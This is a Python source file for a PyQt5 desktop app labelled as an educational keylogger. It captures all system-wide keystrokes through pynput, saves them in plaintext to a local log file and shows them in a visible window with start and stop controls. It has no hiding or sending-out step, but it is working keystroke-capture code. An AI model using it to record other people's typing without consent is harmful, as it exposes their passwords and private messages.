import sys
import logging
from PyQt5.QtWidgets import (
    QApplication, QWidget, QVBoxLayout, QLabel, QPushButton, QTextEdit, QFileDialog
)
from PyQt5.QtCore import Qt, QThread, pyqtSignal
from pynput import keyboard

# Set up logging
LOG_FILE = "key_log.txt"
logging.basicConfig(filename=LOG_FILE, level=logging.DEBUG, format='%(asctime)s: %(message)s')

class KeyloggerThread(QThread):
    key_logged = pyqtSignal(str)

    def __init__(self):
        super().__init__()
        self._listener = None
        self.running = False

    def run(self):
        self.running = True

        def on_press(key):
            try:
                k = key.char
            except AttributeError:
                k = str(key)

            log_entry = f"{k}"
            logging.info(log_entry)
            self.key_logged.emit(log_entry)

        self._listener = keyboard.Listener(on_press=on_press)
        self._listener.start()
        self._listener.join()

    def stop(self):
        if self._listener:
            self._listener.stop()
            self.running = False
            self.quit()

class KeyloggerApp(QWidget):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("🔐 PyQt5 Keylogger - Educational Only")
        self.setGeometry(300, 200, 500, 400)
        self.setStyleSheet("background-color: #1e1e1e; color: #e0e0e0; font-family: Segoe UI;")

        self.layout = QVBoxLayout()

        self.title = QLabel("🛡️ Ethical Keylogger GUI")
        self.title.setStyleSheet("font-size: 18pt; font-weight: bold; color: #00ff90;")
        self.title.setAlignment(Qt.AlignCenter)
        self.layout.addWidget(self.title)

        self.status = QLabel("Status: Not Running")
        self.status.setStyleSheet("color: red; font-size: 12pt;")
        self.status.setAlignment(Qt.AlignCenter)
        self.layout.addWidget(self.status)

        self.start_button = QPushButton("▶ Start Logging")
        self.start_button.setStyleSheet("background-color: #4CAF50; color: white; font-weight: bold;")
        self.start_button.clicked.connect(self.start_logging)
        self.layout.addWidget(self.start_button)

        self.stop_button = QPushButton("⏹ Stop Logging")
        self.stop_button.setStyleSheet("background-color: #f44336; color: white; font-weight: bold;")
        self.stop_button.clicked.connect(self.stop_logging)
        self.layout.addWidget(self.stop_button)

        self.view_button = QPushButton("📄 View Log")
        self.view_button.setStyleSheet("background-color: #2196F3; color: white;")
        self.view_button.clicked.connect(self.view_log)
        self.layout.addWidget(self.view_button)

        self.log_view = QTextEdit()
        self.log_view.setReadOnly(True)
        self.log_view.setStyleSheet("background-color: #2b2b2b; color: #00ff00;")
        self.layout.addWidget(self.log_view)

        self.setLayout(self.layout)
        self.keylogger_thread = None

    def start_logging(self):
        if not self.keylogger_thread or not self.keylogger_thread.running:
            self.keylogger_thread = KeyloggerThread()
            self.keylogger_thread.key_logged.connect(self.update_log_display)
            self.keylogger_thread.start()
            self.status.setText("Status: Logging...")
            self.status.setStyleSheet("color: lime; font-size: 12pt;")

    def stop_logging(self):
        if self.keylogger_thread and self.keylogger_thread.running:
            self.keylogger_thread.stop()
            self.status.setText("Status: Not Running")
            self.status.setStyleSheet("color: red; font-size: 12pt;")

    def view_log(self):
        try:
            with open(LOG_FILE, "r") as f:
                self.log_view.setPlainText(f.read())
        except FileNotFoundError:
            self.log_view.setPlainText("Log file not found.")

    def update_log_display(self, key):
        self.log_view.append(key)

if __name__ == "__main__":
    app = QApplication(sys.argv)
    window = KeyloggerApp()
    window.show()
    sys.exit(app.exec_())
